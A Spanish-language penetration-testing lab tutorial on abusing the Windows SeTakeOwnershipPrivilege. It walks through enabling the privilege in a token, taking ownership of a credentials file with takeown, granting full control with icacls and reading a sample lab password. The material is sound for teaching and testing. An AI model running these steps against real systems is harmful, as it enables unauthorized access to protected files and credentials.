# SeTakeOwnershipPrivilege

[**SeTakeOwnershipPrivilege**](https://learn.microsoft.com/es-es/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) concede a un usuario la capacidad de **tomar posesión** de cualquier "objeto asegurable", lo que incluye objetos de Active Directory, archivos/carpetas NTFS, impresoras, claves de registro, servicios y procesos. Este privilegio asigna derechos de [**WRITE_OWNER**](https://learn.microsoft.com/es-es/windows/win32/secauthz/standard-access-rights) sobre un objeto, lo que significa que el usuario puede **cambiar el propietario** dentro del descriptor de seguridad del objeto.

Los administradores reciben este privilegio por defecto. Aunque es poco frecuente encontrar una cuenta de usuario estándar con este privilegio, sí es posible toparse con **cuentas de servicio** que lo tengan asignado —por ejemplo, cuentas encargadas de ejecutar trabajos de copia de seguridad y snapshots VSS—. A estas cuentas normalmente también se les asignan otros privilegios relacionados, como **SeBackupPrivilege**, **SeRestorePrivilege** y **SeSecurityPrivilege**, para controlar sus capacidades de forma granular sin darles derechos totales de administrador local.

Estas capacidades por sí solas **pueden** facilitar una escalada de privilegios. Sin embargo, en algunos escenarios necesitaremos **tomar la propiedad** de ficheros específicos porque otros métodos están bloqueados o no funcionan como se espera. El abuso de este privilegio es un caso algo extremo, pero vale la pena comprenderlo en profundidad, especialmente en entornos Active Directory donde podríamos asignar este derecho a un usuario controlado y aprovecharlo para leer un archivo sensible en un recurso compartido.


<img width="1239" height="838" alt="image" src="https://github.com/user-attachments/assets/965d3167-5897-4713-8571-a4e4042fbd22" />



La configuración del privilegio de usuario se puede establecer desde la Política de Grupo en la siguiente ruta:

```
Computer Configuration ⇾ Windows Settings ⇾ Security Settings ⇾ Local Policies ⇾ User Rights Assignment
```

En ese contenedor es donde se asignan derechos sensibles como **SeDebugPrivilege**, **SeTakeOwnershipPrivilege**, **SeBackupPrivilege**, entre otros. Modificar estos derechos debe hacerse con cuidado y siguiendo el principio de menor privilegio.




<img width="1642" height="854" alt="image" src="https://github.com/user-attachments/assets/7c9422c4-d152-4ea2-b9b2-cb19eedd4cbd" />


---

## Escenario de abuso

Si detectamos un usuario que posee este privilegio —o si logramos asignárselo mediante un ataque (por ejemplo abuso de GPO con herramientas como [`SharpGPOAbuse`)](https://github.com/FSecureLABS/SharpGPOAbuse)— podemos aprovecharlo para:

* **Tomar control de un recurso compartido** y cambiar permisos/propietario para acceder a ficheros protegidos.
* **Acceder a ficheros sensibles** (documentos con contraseñas, claves SSH, backups) cambiando el owner y luego modificando la ACL para concedernos lectura/escritura.
* **Provocar DoS** sobre servicios que dependen de ficheros concretos (por ejemplo bloquear o sustituir ficheros de configuración críticos).
* **Facilitar RCE** en casos donde la manipulación de un ejecutable/servicio permita ejecutar código con mayor privilegio.


---

# Uso de SeTakeOwnershipPrivilege



## Revisar privilegios del usuario actual

Primero comprobamos los privilegios del token de la sesión actual:

```powershell
whoami /priv
```

**Salida:**

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
```

Si el privilegio aparece como `Disabled`, lo podemos habilitar en nuestro token para la sesión actual.

---

## Habilitar `SeTakeOwnershipPrivilege` en el token

Una forma sencilla en laboratorio es cargar un script que active privilegios en el token (ej.: [`EnableAllTokenPrivs.ps1`](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)).

```powershell
# Importar y ejecutar scripts que habilitan privilegios en el token
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1

# Verificamos de nuevo
whoami /priv
```

**Salida de ejemplo (parcial) tras habilitar:**

```
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```

> **Nota:** esos scripts deben emplearse solo en entornos de prueba o con autorización. En producción la elevación arbitraria de privilegios está prohibida.

---

## Elegir un fichero objetivo y recopilar información

Localiza un fichero interesante en el recurso compartido o en el disco. En el ejemplo se eligió `C:\Department Shares\Private\IT\cred.txt`.

Comprobamos detalles del fichero (nombre completo, fechas, atributos y owner):

```powershell
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | \
  Select Fullname,LastWriteTime,Attributes,@{Name='Owner';Expression={ (Get-Acl $_.FullName).Owner }}
```

Si no aparece el `Owner` (o la consulta falla por permisos), retrocede y mira el propietario del directorio:

```powershell
# Mostrar owner de la carpeta con cmd (ejemplo)
cmd /c dir /q 'C:\Department Shares\Private\IT'
```

**Salida de ejemplo:**

```
 Directory of C:\Department Shares\Private\IT

06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  .
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  ..
06/18/2021  12:23 PM                36 ...                    cred.txt
```

En este ejemplo la carpeta está bajo la propiedad de la cuenta `WINLPE-SRV01\sccm_svc` y contiene `cred.txt`.

---

## Tomar la propiedad del fichero

Si nuestro token tiene el privilegio habilitado, podemos ejecutar `takeown` para cambiar la propiedad del archivo al usuario actual.

```powershell
# Tomar propiedad del archivo
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

**Salida de ejemplo:**

```
SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".
```

Confirmamos que ahora somos propietarios:

```powershell
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | \
  select name,directory,@{Name='Owner';Expression={(Get-ACL $_.Fullname).Owner}}
```

**Salida de ejemplo:**

```
Name     Directory                       Owner
----     ---------                       -----
cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student
```

---

## Modificar la ACL del fichero para conceder permisos de lectura

Ser propietario no siempre implica tener permisos efectivos de lectura. Tras tomar ownership, usamos `icacls` para darnos control total (Full Control):

```powershell
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```

**Salida de ejemplo:**

```
processed file: C:\Department Shares\Private\IT\cred.txt
Successfully processed 1 files; Failed processing 0 files
```

---

## Leer el fichero

Si todo ha funcionado, ahora podemos leer el fichero:

```powershell
Get-Content 'C:\Department Shares\Private\IT\cred.txt'
```

**Salida de ejemplo:**

```
NIX01 admin

root:n1X_p0wer_us3er!
```

> **Atención:** este contenido puede contener credenciales reales. Solo manejarlo según el alcance del engagement y las reglas del cliente.

---


